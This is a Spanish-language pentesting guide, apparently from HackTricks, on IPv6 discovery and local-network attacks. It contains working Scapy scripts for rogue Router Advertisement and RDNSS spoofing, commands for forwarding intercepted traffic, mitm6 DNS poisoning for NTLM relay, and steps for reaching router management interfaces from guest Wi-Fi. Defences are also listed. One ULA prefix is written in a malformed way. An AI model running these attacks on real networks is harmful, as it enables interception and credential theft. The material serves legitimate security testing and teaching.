# Pentesting IPv6

{{#include ../../banners/hacktricks-training.md}}

## Teoría básica de IPv6

### Redes

Las direcciones IPv6 están estructuradas para mejorar la organización de la red y la interacción de dispositivos. Una dirección IPv6 se divide en:

1. **Prefijo de red**: Los primeros 48 bits, que determinan el segmento de la red.
2. **ID de subred**: Los siguientes 16 bits, utilizados para definir subredes específicas dentro de la red.
3. **Identificador de interfaz**: Los últimos 64 bits, que identifican de manera única un dispositivo dentro de la subred.

Mientras que IPv6 omite el protocolo ARP encontrado en IPv4, introduce **ICMPv6** con dos mensajes principales:

- **Solicitud de vecino (NS)**: Mensajes multicast para la resolución de direcciones.
- **Publicidad de vecino (NA)**: Respuestas unicast a NS o anuncios espontáneos.

IPv6 también incorpora tipos de direcciones especiales:

- **Dirección de loopback (`::1`)**: Equivalente a `127.0.0.1` de IPv4, para comunicación interna dentro del host.
- **Direcciones Link-Local (`FE80::/10`)**: Para actividades de red local, no para enrutamiento por internet. Los dispositivos en la misma red local pueden descubrirse entre sí utilizando este rango.

### Uso práctico de IPv6 en comandos de red

Para interactuar con redes IPv6, puedes usar varios comandos:

- **Ping a direcciones Link-Local**: Verifica la presencia de dispositivos locales usando `ping6`.
- **Descubrimiento de vecinos**: Usa `ip neigh` para ver dispositivos descubiertos en la capa de enlace.
- **alive6**: Una herramienta alternativa para descubrir dispositivos en la misma red.

A continuación se presentan algunos ejemplos de comandos:
```bash
ping6 –I eth0 -c 5 ff02::1 > /dev/null 2>&1
ip neigh | grep ^fe80

# Alternatively, use alive6 for neighbor discovery
alive6 eth0
```
Las direcciones IPv6 se pueden derivar de la dirección MAC de un dispositivo para la comunicación local. Aquí hay una guía simplificada sobre cómo derivar la dirección IPv6 Link-local a partir de una dirección MAC conocida, y una breve descripción de los tipos de direcciones IPv6 y métodos para descubrir direcciones IPv6 dentro de una red.

### **Derivando Link-local IPv6 de la dirección MAC**

Dada una dirección MAC **`12:34:56:78:9a:bc`**, puedes construir la dirección IPv6 Link-local de la siguiente manera:

1. Convierte la MAC al formato IPv6: **`1234:5678:9abc`**
2. Precede con `fe80::` e inserta `fffe` en el medio: **`fe80::1234:56ff:fe78:9abc`**
3. Invierte el séptimo bit desde la izquierda, cambiando `1234` a `1034`: **`fe80::1034:56ff:fe78:9abc`**

### **Tipos de Direcciones IPv6**

- **Unique Local Address (ULA)**: Para comunicaciones locales, no destinado a enrutamiento en internet público. Prefijo: **`FEC00::/7`**
- **Multicast Address**: Para comunicación de uno a muchos. Entregado a todas las interfaces en el grupo de multidifusión. Prefijo: **`FF00::/8`**
- **Anycast Address**: Para comunicación de uno a más cercano. Enviado a la interfaz más cercana según el protocolo de enrutamiento. Parte del rango de unicast global **`2000::/3`**.

### **Prefijos de Direcciones**

- **fe80::/10**: Direcciones Link-Local (similar a 169.254.x.x)
- **fc00::/7**: Unique Local-Unicast (similar a rangos privados de IPv4 como 10.x.x.x, 172.16.x.x, 192.168.x.x)
- **2000::/3**: Global Unicast
- **ff02::1**: Multicast Todos los Nodos
- **ff02::2**: Multicast Nodos de Router

### **Descubriendo Direcciones IPv6 dentro de una Red**

#### Forma 1: Usando Direcciones Link-local

1. Obtén la dirección MAC de un dispositivo dentro de la red.
2. Deriva la dirección IPv6 Link-local a partir de la dirección MAC.

#### Forma 2: Usando Multicast

1. Envía un ping a la dirección multicast `ff02::1` para descubrir direcciones IPv6 en la red local.
```bash
service ufw stop # Stop the firewall
ping6 -I <IFACE> ff02::1 # Send a ping to multicast address
ip -6 neigh # Display the neighbor table
```
### IPv6 Man-in-the-Middle (MitM) Attacks

Existen varias técnicas para ejecutar ataques MitM en redes IPv6, tales como:

- Suplantación de anuncios de vecinos o enrutadores ICMPv6.
- Uso de mensajes ICMPv6 de redirección o "Paquete Demasiado Grande" para manipular el enrutamiento.
- Ataque a IPv6 móvil (generalmente requiere que IPSec esté deshabilitado).
- Configuración de un servidor DHCPv6 malicioso.

## Identifying IPv6 Addresses in the eild

### Exploring Subdomains

Un método para encontrar subdominios que están potencialmente vinculados a direcciones IPv6 implica aprovechar los motores de búsqueda. Por ejemplo, emplear un patrón de consulta como `ipv6.*` puede ser efectivo. Específicamente, se puede usar el siguiente comando de búsqueda en Google:
```bash
site:ipv6./
```
### Utilizando Consultas DNS

Para identificar direcciones IPv6, se pueden consultar ciertos tipos de registros DNS:

- **AXFR**: Solicita una transferencia completa de zona, lo que puede descubrir una amplia gama de registros DNS.
- **AAAA**: Busca directamente direcciones IPv6.
- **ANY**: Una consulta amplia que devuelve todos los registros DNS disponibles.

### Sondeo con Ping6

Después de identificar las direcciones IPv6 asociadas con una organización, se puede utilizar la utilidad `ping6` para sondear. Esta herramienta ayuda a evaluar la capacidad de respuesta de las direcciones IPv6 identificadas y también puede ayudar a descubrir dispositivos IPv6 adyacentes.

## Técnicas de Ataque en Redes Locales IPv6

Las siguientes secciones cubren ataques prácticos de capa 2 en IPv6 que se pueden ejecutar **dentro del mismo segmento /64** sin conocer ningún prefijo global. Todos los paquetes mostrados a continuación son **link-local** y viajan solo a través del switch local, lo que los hace extremadamente sigilosos en la mayoría de los entornos.

### Ajuste del Sistema para un Laboratorio Estable

Antes de jugar con el tráfico IPv6, se recomienda endurecer tu equipo para evitar ser envenenado por tus propias pruebas y obtener el mejor rendimiento durante la inyección/escucha masiva de paquetes.
```bash
# Enable promiscuous mode to capture all frames
sudo ip link set dev eth0 promisc on

# Ignore rogue Router Advertisements & Redirects coming from the segment
sudo sysctl -w net.ipv6.conf.all.accept_ra=0
sudo sysctl -w net.ipv6.conf.all.accept_redirects=0

# Increase fd / backlog limits when generating lots of traffic
sudo sysctl -w fs.file-max=100000
sudo sysctl -w net.core.somaxconn=65535
sudo sysctl -w net.ipv4.tcp_tw_reuse=1
```
### Sniffing pasivo de NDP y DHCPv6

Debido a que cada host IPv6 **se une automáticamente a múltiples grupos multicast** (`ff02::1`, `ff02::2`, …) y utiliza ICMPv6 para SLAAC/NDP, puedes mapear todo el segmento sin enviar un solo paquete.  La siguiente línea de código en Python/Scapy escucha los mensajes L2 más interesantes y imprime un registro coloreado y con marca de tiempo de quién es quién:
```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.dhcp6 import *
from datetime import datetime
from colorama import Fore, Style, init
import argparse

init(autoreset=True)

# Human-readable names for protocols we care about
DHCP6_TYPES = {
DHCP6_Solicit:    'Solicit',
DHCP6_Advertise:  'Advertise',
DHCP6_Request:    'Request',
DHCP6_Reply:      'Reply',
DHCP6_Renew:      'Renew',
DHCP6_Rebind:     'Rebind',
DHCP6_RelayForward:'Relay-Forward',
DHCP6_RelayReply: 'Relay-Reply'
}
ICMP6_TYPES = {
ICMPv6ND_RS:      ('Router Solicitation',  Fore.CYAN),
ICMPv6ND_RA:      ('Router Advertisement', Fore.GREEN),
ICMPv6ND_NS:      ('Neighbor Solicitation',Fore.BLUE),
ICMPv6ND_NA:      ('Neighbor Advertisement',Fore.MAGENTA),
ICMPv6ND_Redirect:('Redirect',             Fore.LIGHTRED_EX),
ICMPv6MLReport:   ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLReport2:  ('MLD Report',           Fore.LIGHTCYAN_EX),
ICMPv6MLDone:     ('MLD Done',             Fore.LIGHTCYAN_EX),
ICMPv6EchoRequest:('Echo Request',         Fore.LIGHTBLACK_EX),
ICMPv6EchoReply:  ('Echo Reply',           Fore.LIGHTBLACK_EX)
}

def handler(pkt):
eth_src = pkt[Ether].src if Ether in pkt else '?'
eth_dst = pkt[Ether].dst if Ether in pkt else '?'
ip6_src = pkt[IPv6].src if IPv6 in pkt else '?'
ip6_dst = pkt[IPv6].dst if IPv6 in pkt else '?'

# Identify protocol family first
for proto,(desc,color) in ICMP6_TYPES.items():
if proto in pkt:
break
else:
if UDP in pkt and pkt[UDP].dport == 547:  # DHCPv6 server port
for dhcp_t,name in DHCP6_TYPES.items():
if dhcp_t in pkt:
desc = 'DHCPv6 – '+name; color = Fore.YELLOW; break
else:
return  # not a DHCPv6 message we track
else:
return  # not interesting

print(color + f"[{datetime.now().strftime('%H:%M:%S')}] {desc}")
print(f"  MAC  {eth_src} -> {eth_dst}")
print(f"  IPv6 {ip6_src} -> {ip6_dst}")
print('-'*60)

if __name__ == '__main__':
argp = argparse.ArgumentParser(description='IPv6 NDP & DHCPv6 sniffer')
argp.add_argument('-i','--interface',required=True,help='Interface to sniff')
argp.add_argument('-t','--time',type=int,default=0,help='Duration (0 = infinite)')
a = argp.parse_args()
sniff(iface=a.interface,prn=handler,timeout=a.time or None,store=0)
```
Resultado: una **topología de enlace local** completa (MAC ⇄ IPv6) en cuestión de segundos, sin activar sistemas IPS/IDS que dependen de escaneos activos.

### Suplantación de Anuncios de Router (RA)

Los hosts de IPv6 dependen de **ICMPv6 Router Advertisements** para el descubrimiento de la puerta de enlace predeterminada. Si inyectas RAs falsificados **más frecuentemente** que el router legítimo, los dispositivos cambiarán silenciosamente a ti como la puerta de enlace.
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
p.add_argument('-i','--interface',required=True)
p.add_argument('-m','--mac',required=True,help='Source MAC (will be put in SrcLL option)')
p.add_argument('--llip',required=True,help='Link-local source IP, e.g. fe80::dead:beef')
p.add_argument('-l','--lifetime',type=int,default=1800,help='Router lifetime')
p.add_argument('--interval',type=int,default=5,help='Seconds between RAs')
p.add_argument('--revert',action='store_true',help='Send lifetime=0 to undo attack')
args = p.parse_args()

lifetime = 0 if args.revert else args.lifetime
ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=lifetime, prf=0x1)/  # High preference
ICMPv6NDOptSrcLLAddr(lladdr=args.mac))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
Para **reenviar tráfico** después de ganar la carrera:
```bash
sudo sysctl -w net.ipv6.conf.all.forwarding=1
sudo ip6tables -A FORWARD -i eth0 -j ACCEPT
sudo ip6tables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
#### Router Advertisement Flags (M/O) & Default Router Preference (Prf)

| Flag | Significado | Efecto en el Comportamiento del Cliente |
|------|-------------|----------------------------------------|
| **M (Configuración de Dirección Administrada)** | Cuando se establece en `1`, el host DEBE usar **DHCPv6** para obtener su dirección IPv6. | Toda la dirección proviene de DHCPv6 – perfecto para el envenenamiento estilo *mitm6*. |
| **O (Otra Configuración)** | Cuando se establece en `1`, el host debe usar **DHCPv6** solo para obtener *otra* información (DNS, NTP, …). | La dirección sigue siendo a través de SLAAC, pero DNS puede ser secuestrado con DHCPv6. |
| **M=0 / O=0** | Red pura SLAAC. | Solo son posibles trucos RA / RDNSS – DHCPv6 no será enviado por los clientes. |
| **M=1 / O=1** | Entorno mixto. | Se utilizan tanto DHCPv6 como SLAAC; la superficie para el spoofing es la más grande. |

Durante un pentest, puedes simplemente inspeccionar el RA legítimo una vez y decidir qué vector es factible:
```bash
sudo tcpdump -vvv -i eth0 'icmp6 && ip6[40] == 134'   # capture Router Advertisements
```
Busca el campo `flags [M,O]` en el volcado – no se requiere adivinar.

El campo **Prf** (Preferencia del Router) dentro del encabezado RA controla cuán atractivo se ve tu router falso cuando hay *múltiples* puertas de enlace presentes:

| Valor de Prf | Binario | Significado |
|--------------|---------|-------------|
| **Alto**     | `10`    | Los clientes prefieren este router sobre cualquier router *Medio*/*Bajo* |
| Medio (predeterminado) | `01` | Usado por casi todos los dispositivos legítimos |
| Bajo         | `00`    | Elegido solo cuando no existe un mejor router |

Al generar el paquete con Scapy, puedes configurarlo a través del parámetro `prf` como se muestra arriba (`prf=0x1` → Alto). Combinar **Alto Prf**, un **intervalo corto** y una **vida útil no cero** hace que tu puerta de enlace falsa sea notablemente estable.

---

### Suplantación de RDNSS (DNS) a través de RA

[RFC 8106](https://datatracker.ietf.org/doc/html/rfc8106) permite agregar una opción de **Servidor DNS Recursivo (RDNSS)** dentro de un RA. Los sistemas operativos modernos (Win 10 ≥1709, Win 11, macOS Big Sur, Linux systemd-resolved, …) confían automáticamente en ello:
```python
#!/usr/bin/env python3
from scapy.all import *
import argparse

p = argparse.ArgumentParser()
P = p.add_argument
P('-i','--interface',required=True)
P('--llip',required=True)
P('--dns',required=True,help='Fake DNS IPv6')
P('--lifetime',type=int,default=600)
P('--interval',type=int,default=5)
args = p.parse_args()

ra = (IPv6(src=args.llip,dst='ff02::1',hlim=255)/
ICMPv6ND_RA(routerlifetime=0)/
ICMPv6NDOptRDNSS(dns=[args.dns],lifetime=args.lifetime))

send(ra,iface=args.interface,loop=1,inter=args.interval)
```
Los clientes **antepondrán** su DNS a su lista de resolutores durante el tiempo de vida dado, otorgando un secuestro completo de DNS hasta que el valor expire o envíes un `lifetime=0` para revertir.

### Suplantación de DNS DHCPv6 (mitm6)

En lugar de SLAAC, las redes de Windows a menudo dependen de **DHCPv6 sin estado** para DNS. [mitm6](https://github.com/rofl0r/mitm6) responde automáticamente a los mensajes `Solicit` con un flujo de **Advertise → Reply** que asigna **tu dirección local de enlace como DNS durante 300 segundos**. Esto desbloquea:

* Ataques de retransmisión NTLM (WPAD + secuestro de DNS)
* Interceptar la resolución de nombres internos sin tocar los enrutadores

Uso típico:
```bash
sudo mitm6 -i eth0 --no-ra # only DHCPv6 poisoning
```
### Defensas

* **RA Guard / DHCPv6 Guard / ND Inspection** en switches gestionados.
* ACLs de puerto que permiten solo que la MAC del enrutador legítimo envíe RAs.
* Monitorear por **RAs de alta tasa no sólidas** o cambios súbitos en **RDNSS**.
* Deshabilitar IPv6 en los puntos finales es una solución temporal que a menudo rompe servicios modernos y oculta puntos ciegos; preferir el filtrado L2 en su lugar.

### Descubrimiento de Router NDP en SSIDs de Invitados/Públicos y Exposición de Servicios de Gestión

Muchos enrutadores de consumo exponen demonios de gestión (HTTP(S), SSH/Telnet, TR-069, etc.) en todas las interfaces. En algunas implementaciones, el SSID "invitado/público" está puenteado al WAN/núcleo y es solo IPv6. Incluso si el IPv6 del enrutador cambia en cada arranque, puedes aprenderlo de manera confiable usando NDP/ICMPv6 y luego conectarte directamente al plano de gestión desde el SSID de invitados.

Flujo de trabajo típico desde un cliente conectado al SSID de invitados/públicos:

1) Descubrir el enrutador a través de ICMPv6 Router Solicitation al multicast de Todos los Enrutadores `ff02::2` y capturar el Router Advertisement (RA):
```bash
# Listen for Router Advertisements (ICMPv6 type 134)
sudo tcpdump -vvv -i <IFACE> 'icmp6 and ip6[40]==134'

# Provoke an RA by sending a Router Solicitation to ff02::2
python3 - <<'PY'
from scapy.all import *
send(IPv6(dst='ff02::2')/ICMPv6ND_RS(), iface='<IFACE>')
PY
```
El RA revela la dirección/prefijo local de enlace del enrutador y a menudo una dirección/prefijo global. Si solo se conoce una dirección local de enlace, recuerda que las conexiones deben especificar el índice de zona, por ejemplo, `ssh -6 admin@[fe80::1%wlan0]`.

Alternativa: usa la suite ndisc6 si está disponible:
```bash
# rdisc6 sends RS and prints RAs in a friendly way
rdisc6 <IFACE>
```
2) Acceder a servicios expuestos a través de IPv6 desde la SSID de invitados:
```bash
# SSH/Telnet example (replace with discovered address)
ssh -6 admin@[2001:db8:abcd::1]
# Web UI over IPv6
curl -g -6 -k 'http://[2001:db8:abcd::1]/'
# Fast IPv6 service sweep
nmap -6 -sS -Pn -p 22,23,80,443,7547 [2001:db8:abcd::1]
```
3) Si la shell de gestión proporciona herramientas de captura de paquetes a través de un wrapper (por ejemplo, tcpdump), verifica la inyección de argumentos/nombres de archivo que permita pasar banderas adicionales de tcpdump como `-G/-W/-z` para lograr la ejecución de comandos post-rotate. Ver:

{{#ref}}
../../linux-hardening/privilege-escalation/wildcards-spare-tricks.md
{{#endref}}

Defensas/notas:

- No vincules la gestión a puentes de invitados/públicos; aplica cortafuegos IPv6 en puentes SSID.
- Limita la tasa y filtra NDP/RS/RA en segmentos de invitados donde sea posible.
- Para servicios que deben ser accesibles, aplica authN/MFA y límites de tasa fuertes.

## Referencias

- [Legless – IPv6 Penetration Testing](https://blog.exploit.org/caster-legless/)
- [mitm6](https://github.com/rofl0r/mitm6)
- [RFC 8106 – IPv6 ND DNS Configuration](https://datatracker.ietf.org/doc/html/rfc8106)
- [http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html](http://www.firewall.cx/networking-topics/protocols/877-ipv6-subnetting-how-to-subnet-ipv6.html)
- [https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904](https://www.sans.org/reading-room/whitepapers/detection/complete-guide-ipv6-attack-defense-33904)
- [Practical Guide to IPv6 Attacks in a Local Network](https://habr.com/ru/articles/930526/)
- [FiberGateway GR241AG – Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
